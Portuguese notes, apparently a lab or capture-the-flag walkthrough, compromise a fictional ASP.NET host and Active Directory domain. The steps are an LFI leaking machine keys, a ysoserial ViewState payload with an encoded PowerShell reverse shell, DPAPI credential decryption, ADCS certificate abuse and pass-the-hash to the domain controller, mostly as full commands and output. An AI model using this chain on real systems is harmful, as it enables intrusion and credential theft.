#+title: Start
#+Author:Gabriel

* intro
no endereço 10.5.2.10, tem uma aplicação ASP.NET vulnerável a LFI, permitindo a captura de uma validationKey

http://10.5.2.10/network-reports.aspx?report=web.config

#+begin_src xml
<?xml version="1.0"?>
<configuration>
  <system.web>
    <pages validateRequest="false" enableEventValidation="false" viewStateEncryptionMode="Never"/>
    <machineKey validationKey="56AB7132992003EE87F74AE4D9675D65EED8018D3528C0B8874905B51940DEAF6B85F1D922D19AB8F69781B2326A2F978A064708822FD8C54ED74CADF8592E17" decryptionKey="A69D80B92A16DFE1698DFE86D4CED630FA56D7C1661C8D05744449889B88E8DC" validation="SHA1" decryption="AES"/>
    <customErrors mode="Off"/>
    <compilation defaultLanguage="c#" debug="true"/>
    <!-- CRITICAL SETTING: Allows path traversal in URLs -->
    <httpRuntime relaxedUrlToFileSystemMapping="true" />
  </system.web>

  <system.webServer>
    <staticContent>
      <mimeMap fileExtension=".config" mimeType="text/plain" />
    </staticContent>
  </system.webServer>
</configuration>
#+end_src

* ysonet
YSoNet (previously known as ysoserial.net) is a collection of utilities and property-oriented programming "gadget chains" discovered in common .NET libraries that can, under the right conditions, exploit .NET applications performing unsafe deserialization of objects.

** Setup
fiz o download do .zip em minha máquina linux, e servi com um python server -->
#+begin_src sh
python3 -m http.server 1666
#+end_src

a partir da máquina windows, fiz um GET nesse meu python server para pegar o arquivo .zip -->
#+begin_src powershell
Invoke-WebRequest -Uri "http://192.168.122.1:1666/ysoserial-1.35.zip" -OutFile "$env:TEMP\ysoserial.zip" -UseBasicParsing
#+end_src

e então descomprimi o arquivo -->
#+begin_src powershell
Expand-Archive -Path "$env:TEMP\ysoserial.zip" -DestinationPath "C:\Tools\ysoserial" -Force
#+end_src


* required
para performar este ataque, é necessário -->

- Viewstate generator : CA0B0334

- algorithm : SHA1

- validationkey machinekey :
#+begin_src text
56AB7132992003EE87F74AE4D9675D65EED8018D3528C0B8874905B51940DEAF6B85F1D922D19AB8F69781B2326A2F978A064708822FD8C54ED74CADF8592E17
#+end_src 

- rev shell payload port 9000
#+begin_src powershell
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4ANAAwAC4AMQAxADgAIgAsADkAMAAwADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
#+end_src
  
* uso do ysosreial.exe
#+begin_src sh
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4ANAAwAC4AMQAxADgAIgAsADkAMAAwADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" --generator=CA0B0334 -validationalg="SHA1" -validationkey="56AB7132992003EE87F74AE4D9675D65EED8018D3528C0B8874905B51940DEAF6B85F1D922D19AB8F69781B2326A2F978A064708822FD8C54ED74CADF8592E17"
#+end_src

resultado -->
#+begin_src sh
%2FwEy0xEAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAD1Dzw%2FeG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi0xNiI%2FPg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI%2BDQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U%2BDQogICAgPHNkOlByb2Nlc3M%2BDQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8%2BDQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgcG93ZXJzaGVsbCAtZSBKQUJqQUd3QWFRQmxBRzRBZEFBZ0FEMEFJQUJPQUdVQWR3QXRBRThBWWdCcUFHVUFZd0IwQUNBQVV3QjVBSE1BZEFCbEFHMEFMZ0JPQUdVQWRBQXVBRk1BYndCakFHc0FaUUIwQUhNQUxnQlVBRU1BVUFCREFHd0FhUUJsQUc0QWRBQW9BQ0lBTVFBd0FDNEFNUUF3QUM0QU5BQXdBQzRBTVFBeEFEZ0FJZ0FzQURrQU1BQXdBREFBS1FBN0FDUUFjd0IwQUhJQVpRQmhBRzBBSUFBOUFDQUFKQUJqQUd3QWFRQmxBRzRBZEFBdUFFY0FaUUIwQUZNQWRBQnlBR1VBWVFCdEFDZ0FLUUE3QUZzQVlnQjVBSFFBWlFCYkFGMEFYUUFrQUdJQWVRQjBBR1VBY3dBZ0FEMEFJQUF3QUM0QUxnQTJBRFVBTlFBekFEVUFmQUFsQUhzQU1BQjlBRHNBZHdCb0FHa0FiQUJsQUNnQUtBQWtBR2tBSUFBOUFDQUFKQUJ6QUhRQWNnQmxBR0VBYlFBdUFGSUFaUUJoQUdRQUtBQWtBR0lBZVFCMEFHVUFjd0FzQUNBQU1BQXNBQ0FBSkFCaUFIa0FkQUJsQUhNQUxnQk1BR1VBYmdCbkFIUUFhQUFwQUNrQUlBQXRBRzRBWlFBZ0FEQUFLUUI3QURzQUpBQmtBR0VBZEFCaEFDQUFQUUFnQUNnQVRnQmxBSGNBTFFCUEFHSUFhZ0JsQUdNQWRBQWdBQzBBVkFCNUFIQUFaUUJPQUdFQWJRQmxBQ0FBVXdCNUFITUFkQUJsQUcwQUxnQlVBR1VBZUFCMEFDNEFRUUJUQUVNQVNRQkpBRVVBYmdCakFHOEFaQUJwQUc0QVp3QXBBQzRBUndCbEFIUUFVd0IwQUhJQWFRQnVBR2NBS0FBa0FHSUFlUUIwQUdVQWN3QXNBREFBTEFBZ0FDUUFhUUFwQURzQUpBQnpBR1VBYmdCa0FHSUFZUUJqQUdzQUlBQTlBQ0FBS0FCcEFHVUFlQUFnQUNRQVpBQmhBSFFBWVFBZ0FESUFQZ0FtQURFQUlBQjhBQ0FBVHdCMUFIUUFMUUJUQUhRQWNnQnBBRzRBWndBZ0FDa0FPd0FrQUhNQVpRQnVBR1FBWWdCaEFHTUFhd0F5QUNBQVBRQWdBQ1FBY3dCbEFHNEFaQUJpQUdFQVl3QnJBQ0FBS3dBZ0FDSUFVQUJUQUNBQUlnQWdBQ3NBSUFBb0FIQUFkd0JrQUNrQUxnQlFBR0VBZEFCb0FDQUFLd0FnQUNJQVBnQWdBQ0lBT3dBa0FITUFaUUJ1QUdRQVlnQjVBSFFBWlFBZ0FEMEFJQUFvQUZzQWRBQmxBSGdBZEFBdUFHVUFiZ0JqQUc4QVpBQnBBRzRBWndCZEFEb0FPZ0JCQUZNQVF3QkpBRWtBS1FBdUFFY0FaUUIwQUVJQWVRQjBBR1VBY3dBb0FDUUFjd0JsQUc0QVpBQmlBR0VBWXdCckFESUFLUUE3QUNRQWN3QjBBSElBWlFCaEFHMEFMZ0JYQUhJQWFRQjBBR1VBS0FBa0FITUFaUUJ1QUdRQVlnQjVBSFFBWlFBc0FEQUFMQUFrQUhNQVpRQnVBR1FBWWdCNUFIUUFaUUF1QUV3QVpRQnVBR2NBZEFCb0FDa0FPd0FrQUhNQWRBQnlBR1VBWVFCdEFDNEFSZ0JzQUhVQWN3Qm9BQ2dBS1FCOUFEc0FKQUJqQUd3QWFRQmxBRzRBZEFBdUFFTUFiQUJ2QUhNQVpRQW9BQ2tBIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8%2BDQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgsWae3rwAKmPk%2BL3iYm0KmUtnXfLQ%3D%3D
#+end_src

copiar a post request que é feita no index da aplicação -->
#+begin_src sh
curl 'http://10.5.2.10/default.aspx' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://10.5.2.10' \
  -H 'Referer: http://10.5.2.10/default.aspx' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36' \
  --data-raw '__VIEWSTATE=%2FwEy0xEAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAD1Dzw%2FeG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi0xNiI%2FPg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI%2BDQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U%2BDQogICAgPHNkOlByb2Nlc3M%2BDQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8%2BDQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgcG93ZXJzaGVsbCAtZSBKQUJqQUd3QWFRQmxBRzRBZEFBZ0FEMEFJQUJPQUdVQWR3QXRBRThBWWdCcUFHVUFZd0IwQUNBQVV3QjVBSE1BZEFCbEFHMEFMZ0JPQUdVQWRBQXVBRk1BYndCakFHc0FaUUIwQUhNQUxnQlVBRU1BVUFCREFHd0FhUUJsQUc0QWRBQW9BQ0lBTVFBd0FDNEFNUUF3QUM0QU5BQXdBQzRBTVFBeEFEZ0FJZ0FzQURrQU1BQXdBREFBS1FBN0FDUUFjd0IwQUhJQVpRQmhBRzBBSUFBOUFDQUFKQUJqQUd3QWFRQmxBRzRBZEFBdUFFY0FaUUIwQUZNQWRBQnlBR1VBWVFCdEFDZ0FLUUE3QUZzQVlnQjVBSFFBWlFCYkFGMEFYUUFrQUdJQWVRQjBBR1VBY3dBZ0FEMEFJQUF3QUM0QUxnQTJBRFVBTlFBekFEVUFmQUFsQUhzQU1BQjlBRHNBZHdCb0FHa0FiQUJsQUNnQUtBQWtBR2tBSUFBOUFDQUFKQUJ6QUhRQWNnQmxBR0VBYlFBdUFGSUFaUUJoQUdRQUtBQWtBR0lBZVFCMEFHVUFjd0FzQUNBQU1BQXNBQ0FBSkFCaUFIa0FkQUJsQUhNQUxnQk1BR1VBYmdCbkFIUUFhQUFwQUNrQUlBQXRBRzRBWlFBZ0FEQUFLUUI3QURzQUpBQmtBR0VBZEFCaEFDQUFQUUFnQUNnQVRnQmxBSGNBTFFCUEFHSUFhZ0JsQUdNQWRBQWdBQzBBVkFCNUFIQUFaUUJPQUdFQWJRQmxBQ0FBVXdCNUFITUFkQUJsQUcwQUxnQlVBR1VBZUFCMEFDNEFRUUJUQUVNQVNRQkpBRVVBYmdCakFHOEFaQUJwQUc0QVp3QXBBQzRBUndCbEFIUUFVd0IwQUhJQWFRQnVBR2NBS0FBa0FHSUFlUUIwQUdVQWN3QXNBREFBTEFBZ0FDUUFhUUFwQURzQUpBQnpBR1VBYmdCa0FHSUFZUUJqQUdzQUlBQTlBQ0FBS0FCcEFHVUFlQUFnQUNRQVpBQmhBSFFBWVFBZ0FESUFQZ0FtQURFQUlBQjhBQ0FBVHdCMUFIUUFMUUJUQUhRQWNnQnBBRzRBWndBZ0FDa0FPd0FrQUhNQVpRQnVBR1FBWWdCaEFHTUFhd0F5QUNBQVBRQWdBQ1FBY3dCbEFHNEFaQUJpQUdFQVl3QnJBQ0FBS3dBZ0FDSUFVQUJUQUNBQUlnQWdBQ3NBSUFBb0FIQUFkd0JrQUNrQUxnQlFBR0VBZEFCb0FDQUFLd0FnQUNJQVBnQWdBQ0lBT3dBa0FITUFaUUJ1QUdRQVlnQjVBSFFBWlFBZ0FEMEFJQUFvQUZzQWRBQmxBSGdBZEFBdUFHVUFiZ0JqQUc4QVpBQnBBRzRBWndCZEFEb0FPZ0JCQUZNQVF3QkpBRWtBS1FBdUFFY0FaUUIwQUVJQWVRQjBBR1VBY3dBb0FDUUFjd0JsQUc0QVpBQmlBR0VBWXdCckFESUFLUUE3QUNRQWN3QjBBSElBWlFCaEFHMEFMZ0JYQUhJQWFRQjBBR1VBS0FBa0FITUFaUUJ1QUdRQVlnQjVBSFFBWlFBc0FEQUFMQUFrQUhNQVpRQnVBR1FBWWdCNUFIUUFaUUF1QUV3QVpRQnVBR2NBZEFCb0FDa0FPd0FrQUhNQWRBQnlBR1VBWVFCdEFDNEFSZ0JzQUhVQWN3Qm9BQ2dBS1FCOUFEc0FKQUJqQUd3QWFRQmxBRzRBZEFBdUFFTUFiQUJ2QUhNQVpRQW9BQ2tBIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8%2BDQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgsWae3rwAKmPk%2BL3iYm0KmUtnXfLQ%3D%3D&__VIEWSTATEGENERATOR=CA0B0334&txtCustomerID=12&btnLookup=Lookup' \
  --insecure ;
curl 'http://10.5.2.10/images/banner.jpg' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36' \
  -H 'Referer: http://10.5.2.10/default.aspx'
#+end_src

* post-exploitation
alguns achados no sistema -->
#+begin_src powershell
PS C:\Program Files\TelecomApp> dir


    Directory: C:\Program Files\TelecomApp


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          5/8/2021   1:14 AM          36864 TelecomApp.exe                                                       


PS C:\Program Files\TelecomApp> reg query 'HKEY_LOCAL_MACHINE\SOFTWARE\'

HKEY_LOCAL_MACHINE\SOFTWARE\Classes
HKEY_LOCAL_MACHINE\SOFTWARE\Clients
HKEY_LOCAL_MACHINE\SOFTWARE\CVSM
HKEY_LOCAL_MACHINE\SOFTWARE\DefaultUserEnvironment
HKEY_LOCAL_MACHINE\SOFTWARE\Google
HKEY_LOCAL_MACHINE\SOFTWARE\Intel
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft
HKEY_LOCAL_MACHINE\SOFTWARE\ODBC
HKEY_LOCAL_MACHINE\SOFTWARE\OpenSSH
HKEY_LOCAL_MACHINE\SOFTWARE\Partner
HKEY_LOCAL_MACHINE\SOFTWARE\Policies
HKEY_LOCAL_MACHINE\SOFTWARE\RegisteredApplications
HKEY_LOCAL_MACHINE\SOFTWARE\Setup
HKEY_LOCAL_MACHINE\SOFTWARE\TelecomApp
HKEY_LOCAL_MACHINE\SOFTWARE\VMware, Inc.
HKEY_LOCAL_MACHINE\SOFTWARE\Windows
HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node
#+end_src

verificando esta hkey do telecomapp -->
#+begin_src powershell
PS C:\Program Files\TelecomApp> reg query 'HKEY_LOCAL_MACHINE\SOFTWARE\TelecomApp'

HKEY_LOCAL_MACHINE\SOFTWARE\TelecomApp
    UserName    REG_SZ    tel_admin01@telecore.ad
    EncryptedPassword    REG_SZ    AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAOUxfpmwAV0WYASgF0p7AyQQAAAACAAAAAAAQZgAAAAEAACAAAACfRzkiyK0ji3RdkhsaKqqDYsIEjHcf4KqabRvSSLhlYgAAAAAOgAAAAAIAACAAAABEfkfJYtEx/l+8wBsNz9HAw1AJmQNS+us4XMqhU8eGFRAAAAD/q61IY4NbDaBrnEWiK2H4QAAAAK7m74B/E53IMZ/KZpmnDvmJb4oix61AGSZ4vefPou1ZcHRdaR75WJs6PBR7H6/yBz9sn2thUhkCiJar8JSWVKw=
#+end_src

as credencias estão salvas nesta hkey, em base 64.

#+begin_src powershell
Add-Type -AssemblyName System.Security
#+end_src

processo para pegar a senha em plaintext -->
#+begin_src powershell
PS C:\> $encryptedString = (reg query 'HKLM\SOFTWARE\TelecomApp' /v EncryptedPassword | findstr 'REG_SZ')
PS C:\> $encryptedString
    EncryptedPassword    REG_SZ    AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAOUxfpmwAV0WYASgF0p7AyQQAAAACAAAAAAAQZgAAAAEAACAAAACfRzkiyK0ji3RdkhsaKqqDYsIEjHcf4KqabRvSSLhlYgAAAAAOgAAAAAIAACAAAABEfkfJYtEx/l+8wBsNz9HAw1AJmQNS+us4XMqhU8eGFRAAAAD/q61IY4NbDaBrnEWiK2H4QAAAAK7m74B/E53IMZ/KZpmnDvmJb4oix61AGSZ4vefPou1ZcHRdaR75WJs6PBR7H6/yBz9sn2thUhkCiJar8JSWVKw=
PS C:\> $encryptedString = $encryptedString.Trim() -replace '^.*REG_SZ\s+', ''
PS C:\> $encryptedString
AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAOUxfpmwAV0WYASgF0p7AyQQAAAACAAAAAAAQZgAAAAEAACAAAACfRzkiyK0ji3RdkhsaKqqDYsIEjHcf4KqabRvSSLhlYgAAAAAOgAAAAAIAACAAAABEfkfJYtEx/l+8wBsNz9HAw1AJmQNS+us4XMqhU8eGFRAAAAD/q61IY4NbDaBrnEWiK2H4QAAAAK7m74B/E53IMZ/KZpmnDvmJb4oix61AGSZ4vefPou1ZcHRdaR75WJs6PBR7H6/yBz9sn2thUhkCiJar8JSWVKw=
PS C:\> $encryptedBytes = [Convert]::FromBase64String($encryptedString)
PS C:\> $decryptedBytes =
[System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes,
$null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)                
PS C:\> $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
PS C:\> $plaintextPassword = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
PS C:\> $plaintextPassword
T3l@Com#1
#+end_src

testando as credenciais com o certipy-ad -->
#+begin_src sh
certipy find -u 'tel_admin01@telecore.ad' -p 'T3l@Com#1' -dc-ip 10.5.2.2 -vulnerable -stdout -debug
#+end_src
com o certipy é possível verificar que o user tel_admin01 tem full control no template badges

pegar o SID do tel_admin01 -->
#+begin_src sh
rpcclient --user 'telecore.ad/tel_admin01' --password 'T3l@Com#1' 10.5.2.2 -c "lookupnames administrator"

administrator S-1-5-21-1588247407-410625039-1511794522-500
#+end_src

fazendo a request do template vuln -->
#+begin_src sh
certipy -debug req -u 'tel_admin01@telecore.ad' -p 'T3l@Com#1' -target 10.5.2.8 -ca 'telecore-PKI-SRV-CA' -template 'Badges' -upn 'administrator@telecore.ad' -sid 'S-1-5-21-1588247407-410625039-1511794522-500'
#+end_src

após gerar o .pfx, -->
#+begin_src sh
certipy -debug auth -pfx administrator.pfx -dc-ip 10.5.2.2

[*] Got hash for 'administrator@telecore.ad': aad3b435b51404eeaad3b435b51404ee:bfb19bca32a6aab8e0b9a836da860e32
#+end_src

* RCE on DC & Exchange Server enum
vamos usar o smbclient para acessar o DC com este hash do admin -->
#+begin_src sh
smbclient \\\\10.5.2.2\\C$ -U 'administrator%bfb19bca32a6aab8e0b9a836da860e32' --pw-nt-hash

smb: \> cd Windows\System32\Tasks\
smb: \Windows\System32\Tasks\> ls

T3l@Net#2
#+end_src

dentro de "Exchange Mailbox Programmatic Access -->"
#+begin_src xml
   <Actions Context="Author">
  41 │     <Exec>
  42 │       <Command>C:\Users\Administrator\Downloads\impersonate.ps1</Command>
  43 │     </Exec>
  44 │   </Actions>
  45 │ </Task>
#+end_src
